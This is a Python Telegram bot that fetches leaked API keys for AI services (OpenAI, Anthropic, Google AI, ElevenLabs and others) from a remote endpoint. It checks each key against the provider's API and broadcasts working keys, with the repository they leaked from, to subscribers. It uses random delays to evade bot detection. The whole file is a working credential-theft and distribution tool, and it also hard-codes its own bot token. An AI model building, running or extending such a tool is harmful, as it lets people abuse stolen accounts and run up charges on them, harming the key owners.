import telebot
import requests
import time
import threading
import random
import os
from flask import Flask

# --- FLASK SETUP (For Render Port 10000 Exposure) ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is Running!", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- CONFIGURATION ---
API_TOKEN = '8474261468:AAF3TZemleBwXKv27mFdMY0w4T57kZh_nLk'
VERCEL_API_URL = "https://api-api-nine.vercel.app/get-key?key=CHIRAGx9"
bot = telebot.TeleBot(API_TOKEN)

# In-memory storage for subscribers
subscribers = set()

# --- MULTI-SERVICE TESTER CLASS ---
class APITester:
    @staticmethod
    def test_key(api_key, service):
        try:
            # 1. ElevenLabs Tester (Checks Tier & Credits)
            if service == "ElevenLabs":
                res = requests.get("https://api.elevenlabs.io/v1/user/subscription", 
                                   headers={"xi-api-key": api_key}, timeout=8)
                if res.status_code == 200:
                    d = res.json()
                    rem = d.get('character_limit', 0) - d.get('character_count', 0)
                    return True, f"✅ Working | Tier: {d.get('tier')} | Chars Left: {rem}"
            
            # 2. Google AI (Gemini) Tester
            elif service == "GoogleAI":
                res = requests.get(f"https://generativelanguage.googleapis.com/v1beta/models?key={api_key}", timeout=8)
                if res.status_code == 200:
                    return True, "✅ Working | Gemini Pro Access: OK"

            # 3. OpenAI Style Testers (OpenAI, DeepSeek, TogetherAI, Groq, Mistral, Anthropic)
            else:
                endpoints = {
                    "OpenAI": "https://api.openai.com/v1/models",
                    "DeepSeek": "https://api.deepseek.com/models",
                    "TogetherAI": "https://api.together.xyz/v1/models",
                    "Groq": "https://api.groq.com/openai/v1/models",
                    "Mistral": "https://api.mistral.ai/v1/models",
                    "Anthropic": "https://api.anthropic.com/v1/messages" # Requires different header but models works for ping
                }
                url = endpoints.get(service, "https://api.openai.com/v1/models")
                headers = {"Authorization": f"Bearer {api_key}"}
                
                # Special Case for Anthropic
                if service == "Anthropic":
                    headers = {"x-api-key": api_key, "anthropic-version": "2023-06-01"}
                
                res = requests.get(url, headers=headers, timeout=8)
                if res.status_code == 200:
                    return True, f"✅ Working | {service} API Active"
            
            return False, "Invalid"
        except:
            return False, "Timeout/Error"

# --- BACKGROUND MONITOR ---
def api_monitor():
    print("🚂 Background Engine with Validator Started... 💀")
    tester = APITester()
    
    while True:
        if subscribers:
            try:
                # 1. Fetch Key from Vercel
                response = requests.get(VERCEL_API_URL, timeout=15)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("success"):
                        intel = data["intel"]
                        api_key = intel["api_key"]
                        service = intel["service"]

                        # 2. MASTER-MIND VALIDATION (Only send if actually working)
                        is_working, test_msg = tester.test_key(api_key, service)

                        if is_working:
                            msg = (
                                f"🔥 *VERIFIED WORKING API* 🔥\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"📡 *Service:* `{service}`\n"
                                f"🔑 *API Key:* `{api_key}`\n"
                                f"📝 *Test Result:* {test_msg}\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"📅 *First Found:* `{intel['dates']['first_found']}`\n"
                                f"🔍 *Displays:* `{intel['metrics']['times_displayed']}`\n"
                                f"🔗 *Source:* [View Repository]({intel['source_leak']['repo_url']})\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"👤 *Developer:* @dex4dev | *Owner:* CHIRAGX9\n\n"
                                f"⚠️ /UNSUBSCRIBE to stop alerts."
                            )
                            for user_id in list(subscribers):
                                try:
                                    bot.send_message(user_id, msg, parse_mode="Markdown", disable_web_page_preview=True)
                                except: pass
                        else:
                            print(f"💀 Skipped Invalid Key for {service}")
            except Exception as e:
                print(f"Fetch Error: {e}")

        # Random delay between 20s to 5min to bypass bot detection
        wait_time = random.randint(20, 300)
        time.sleep(wait_time)

# --- BOT COMMANDS ---

@bot.message_handler(commands=['start', 'subscribe', 'SUBSCRIBE'])
def start_command(message):
    subscribers.add(message.chat.id)
    welcome_text = (
        "🤖 *PROFESSIONAL API INTELLIGENCE* 🤖\n\n"
        "YOU HAVE SUBSCRIBED TO OUR SERVICE. NOW YOU WILL RECEIVE EVERY WORKING API DIRECTLY.\n\n"
        "👉 /UNSUBSCRIBE TO STOP OUR SERVICE."
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    total_users = len(subscribers)
    stats_text = (
        "📊 *SERVICE STATISTICS* 📊\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 *Total Subscribers:* `{total_users}`\n"
        f"🟢 *Bot Status:* `Online & Monitoring`\n"
        f"🛡️ *Engine:* `Master-Mind Validator v3.0`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👤 *Owner:* CHIRAGX9"
    )
    bot.reply_to(message, stats_text, parse_mode="Markdown")

@bot.message_handler(commands=['unsubscribe', 'UNSUBSCRIBE'])
def stop_command(message):
    if message.chat.id in subscribers:
        subscribers.remove(message.chat.id)
    bot.reply_to(message, "You have successfully stopped the service. To start again message /SUBSCRIBE.")

# --- EXECUTION ---
if __name__ == "__main__":
    # 1. Start Flask for Render Port Binding
    threading.Thread(target=run_flask, daemon=True).start()
    # 2. Start Background Key Monitoring
    threading.Thread(target=api_monitor, daemon=True).start()
    # 3. Start Bot Polling
    print("🔥 Master Bot & Port 10000 are Live... 💀")
    bot.infinity_polling()
